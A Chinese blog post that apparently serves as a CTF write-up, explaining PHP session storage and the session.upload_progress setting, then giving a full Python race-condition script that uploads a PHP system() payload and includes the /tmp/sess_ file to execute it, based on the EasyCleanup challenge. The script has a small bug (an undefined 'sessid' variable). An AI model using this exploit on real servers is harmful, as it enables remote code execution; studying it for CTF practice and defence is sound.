+++
date = '2022-08-25T18:12:21+08:00'
draft = false
title = 'PHP的session文件包含与条件竞争'
tags = ['ctf', 'web', 'session']
categories = ['ctf']
+++

lamaper@qq.com

[lamaper - 博客园 (cnblogs.com)](https://www.cnblogs.com/lamaper/)

## 一、什么是Session

> Session：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。

由于html的特性，多个请求之间无关联，如果在/xxx.html中为登录状态，那么跳转到/yyy.html就会变成默认的未登录状态，seesion的出现是为了弥补这一缺陷，让每一个用户在多个请求中状态一致。

session是保存在服务端的，与之相对的是cookie，cookie是保存在客户端的。每当用户使用一浏览器开始对服务器发出请求，一个session就会被创建，当用户关闭浏览器结束访问，session会被删除。所以用同一个ip访问同一个网站，如果浏览器不同，用户状态也是不同的，所以session创建的标准是浏览器而不是ip。session不随刷新页面而消失。

> 以下内容以php举例

每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，同时也会自动往cookie里写入一个名字为PHPSESSID的变量，它的值正是session_id，当这次会话没结束，再次访问的时候，服务器会去读取这个PHPSESSID的cookie是否有值有没过期，如果能够读取到，则继续用这个session_id，如果没有，就会新生成一个session_id，同时生成PHPSESSID这个cookie。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id。

这个session是32位的。

session的存储地址在``php.ini``文件中会被标明，一般最后一级目录会是``\tmp``，当一个会话开始的时候，服务器会在目录下写入``sess_xxxxxxxxxx``文件，下划线后的就是这个会话的session_id。

## 二、一些session的服务端操作

一般我们通过``$_SESSION['<变量名>'] = ....``将一些数据存储在session中。这些数据最终会被以序列化后的格式存储在sess_文件中。session.save_handler = files 表示的是session的存储方式，默认的是files文件的方式保存。

### 一些常用的函数与参数

``save_handler ``不仅仅只能用文件files，还可以用我们常见的memcache 和 redis 来保存。

``session.use_cookies`` 默认是1，表示会在浏览器里创建值为PHPSESSID的session_id，session.name = PHPSESSID 找个配置就是改这个名字的，这个名称可以进行修改，如修改成PhPP，就会在浏览器cookie中创建PhPP的sessionid。

``session.auto_start = 0 ``用来是否需要自动开启session，默认是不开启的，所有我们需要在代码中用到session_start()；函数开启，如果设置成1，那么session_id 也会自动就生成了。

``session.cookie_lifetime = 0 ``这个是设置在客户端生成PHPSESSID这个cookie的过期时间，默认是0，也就是关闭浏览器就过期，下次访问，会再次生成一个session_id。所以，如果想关闭浏览器会话后，希望session信息能够保持的时间长一点，可以把这个值设置大一点，单位是秒。

``gc_divisor``, ``gc_probability``, ``gc_maxlifetime ``是回收这些sess_xxxxx 的文件，它是按照这3个参数，组成的比率，来启动GC删除这些过期的sess文件。gc_maxlifetime是sess_xxx文件的过期时间。

## 三、session恶意代码

在``phpinfo()``中存在这些数据

```php
1,session.save_handler	files	files
    表示session以文件的形式存储。
2,session.save_path	/tmp	/tmp
    表示session存储目录在/tmp下。
3,session.serialize_handler	php	php
    表示反序列化和序列号的处理器是PHP。
4,session.upload_progress.cleanup	On	On
    表示文件上传结束后，php会立即清除对应session文件中的内容。
5,session.upload_progress.enabled	On	On
    表示upload_progress功能启动，即浏览器向服务器上传文件时，php会把此次文件上传的详细信息存储在session中。
6,session.upload_progress.freq	1%	1%
7,session.upload_progress.min_freq	1	1
    freq 和 min_freq 两项用来设置服务器端对进度信息的更新频率。合理的设置这两项可以减轻服务器的负担。
8,session.upload_progress.name	PHP_SESSION_UPLOAD_PROGRESS	PHP_SESSION_UPLOAD_PROGRESS
9,session.upload_progress.prefix	upload_progress_	upload_progress_
    prefix 和 name 两项用来设置进度信息在session中存储的变量名/键名
10,session.use_cookies	On	On
    表示使用cookie记录sessionid。
11,session.use_only_cookies	On	On
    表示是否在客户端仅仅使用 cookie 来存放会话 ID。
12,session.use_strict_mode	Off	Off
    值为off，表示Cookie中的sessionid可控。
```

一般来说PHP_SESSION_UPLOAD_PROGRESS是开的，所以我们一般会往这个键值中写入恶意代码，然后让整个sess文件被文件包含后解析代码，最终执行代码。

以[ NSSCTF - 第五空间 2021\EasyCleanup (ctfer.vip)](https://www.ctfer.vip/problem/336)为例

服务端代码出现

```php
if(isset($_GET['file'])){ 
    if(strlen($_GET['file']) > 15 | filter($_GET['file'])) exit("hacker"); 
    include $_GET['file']; 
} 
```

我们考虑进行文件包含，之后使用其他方法先对phpinfo进行查看，观察是否关闭了``session.upload_progress.cleanup``，若没有则可以直接使用burp上传恶意代码，若存在则需要不停上传同一个session来确保恶意代码能够执行。

## 四、脚本编写

我们一般通过python进行脚本编写（python版本3.8+）

### 首先导入两个库

```python
import threading
import requests
```

requests用来进行网络请求，threading用来分离线程，做到不断循环上传session从而竞争。

### 定义基本信息

```python
target_url = "http://xxx.xxx.xxx.xxx/index.php"#据情况而定
session_id = "flag"#自行决定
expcode = {"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('ls');?>"}#自行要执行的代码
MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致
proxies = {
    "http": "127.0.0.1:8080",
}#设置本机代理，也可以不设置
```

### 编写竞争函数

```python
def send_file(session):#形参为后面多线程的指令集提供入口
    while True:
        resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', "nothing")}, cookies=MyCookie)
```

不停的上传同样的post请求。将结果存于res.txt中。

### 编写读取信息函数

```python
def getflag(session):
    while True:
        payload_url = target_url + '?file=' + '/tmp/sess_' + session_id
        #根据漏洞进行伪协议读取文件
        resp = requests.get(url=payload_url)
        if 'upload_progress' in resp.text:
            print(resp.text)
            break
```

### main函数

```python
if __name__ == '__main__':
    session = requests.session()
    t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程
    t.start()
    #两个线程独立运行
    getflag(session)
```

### 完整代码

```python
import threading
import requests

target_url = "http://xxx.xxx.xxx.xxx/index.php"#据情况而定
session_id = "flag"#自行决定
expcode = {"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('ls');?>"}#自行要执行的代码
MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致
proxies = {
    "http": "127.0.0.1:8080",
}#设置本机代理，也可以不设置

def send_file(session):#形参为后面多线程的指令集提供入口
    while True:
        resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', "nothing")}, cookies=MyCookie)
        
def getflag(session):
    while True:
        payload_url = target_url + '?file=' + '/tmp/sess_' + session_id
        #根据漏洞进行伪协议读取文件
        resp = requests.get(url=payload_url)
        if 'upload_progress' in resp.text:
            print(resp.text)
            break

if __name__ == '__main__':
    session = requests.session()
    t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程
    t.start()
    #两个线程独立运行
    getflag(session)
```

### 五、参考文献与拓展

[什么是session | 许小珂 (xuxiaoke.com)](https://www.xuxiaoke.com/phpnote/35.html)

[从第五空间 2021\EasyCleanup认识php_session_Aiwin-Lau的博客-CSDN博客](https://blog.csdn.net/weixin_53090346/article/details/125037416)

[PHP Session.upload_progress - chalan630 - 博客园 (cnblogs.com)](https://www.cnblogs.com/chalan630/p/14147602.html)

[PHP：会话上传进度 （php官网）](https://www.php.net/manual/en/session.upload-progress.php#:~:text=Session Upload Progress. When the session.upload_progress.enabled INI option,(via XHR for example) to check the status.)

[对于session.upload_progress漏洞的理解_huamanggg的博客-CSDN博客](https://blog.csdn.net/m0_51078229/article/details/114440061)

[ 详解利用session进行文件包含_合天网安实验室的博客-CSDN博客_session文件包含](https://blog.csdn.net/qq_38154820/article/details/120300273)

